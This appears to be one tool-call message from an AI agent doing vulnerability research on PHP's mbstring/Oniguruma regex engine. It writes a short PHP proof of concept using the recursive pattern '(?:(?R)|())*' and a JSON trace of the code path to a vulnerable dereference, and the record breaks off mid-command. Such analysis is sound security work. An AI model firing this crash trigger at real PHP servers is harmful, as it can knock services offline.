message:
Command `cd /workspace && python3 - <<'PY'
from pathlib import Path
p=Path('poc12.php')
p.write_text('<?php mb_regex_encoding("UTF-8"); mb_ereg_search_init("", "2"); var_dump(mb_eregi_replace("2", "", "")); var_dump(mb_ereg_search_pos("(?:(?R)|())*")); ?>')
trace=[
 {"step":1,"file":"ext/mbstring/tests/bug72399.phpt","function":"<global>","line":8,"var":"search_re","code":"$var5 = mb_ereg_search_init("" ,"2");","note":"The vulnerability is reachable through mbstring's shared search regex state, which can be primed by mb_ereg_search_init()."},
 {"step":2,"file":"ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_eregi_replace)","line":1267,"var":"pattern","code":"if ((re = php_mbregex_compile_pattern(arg_pattern, arg_pattern_len, MBREX(regex_default_options), MBREX(current_mbctype), MBREX(regex_default_syntax))) == NULL) {","note":"mb_eregi_replace() compiles a user-supplied pattern and can mutate shared regex state during the same request."},
 {"step":3,"file":"ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_pos)","line":1410,"var":"MBREX(search_re)","code":"if ((MBREX(search_re) = php_mbregex_compile_pattern(arg_pattern, arg_pattern_len, option, MBREX(current_mbctype), MBREX(regex_default_syntax))) == NULL) {","note":"A fresh pattern argument to mb_ereg_search_pos() triggers compilation through the same Oniguruma path."},
 {"step":4,"file":"oniguruma/src/oniguruma.h","function":"<global>","line":505,"var":"ONIG_SYN_OP2_QMARK_PERL_SUBEXP_CALL","code":"#define ONIG_SYN_OP2_QMARK_PERL_SUBEXP_CALL     (1U<<27) /* (?R), (?&name)... */","note":"The engine accepts Perl recursion syntax, enabling recursive nodes within a repeated body."},
 {"step":5,"file":"oniguruma/src/regcomp.c","function":"infinite_recursive_call_check_trav","line":4095,"var":"NODE_IS_RECURSION(node)","code":"if (NODE_IS_RECURSION(node) && NODE_IS_CALLED(node)) {","note":"Recursive constructs are tracked by the compiler and can reach later quantifier analysis."},
 {"step":6,"file":"oniguruma/src/regcomp.c","function":"tune_quant","line":5458,"var":"qn->emptiness","code":"qn->emptiness = quantifiers_memory_node_info(body);","note":"When the repeated body has zero minimum length, the compiler invokes the emptiness classifier on the AST body."},
 {"step":7,"file":"oniguruma/src/regcomp.c","function":"quantifiers_memory_node_info","line":4912,"var":"BODY_MAY_BE_EMPTY_REC","code":"if (NODE_IS_RECURSION(node)) { return BODY_MAY_BE_EMPTY_REC; }","note":"The recursive empty-repeat case is the exact state that later leads to the vulnerable dereference in the issue path."}
]
Path('candidate_trace.json').write_text(__import__('json').dumps(trace))
PY
cat /workspace/candidate_trace.json && echo '
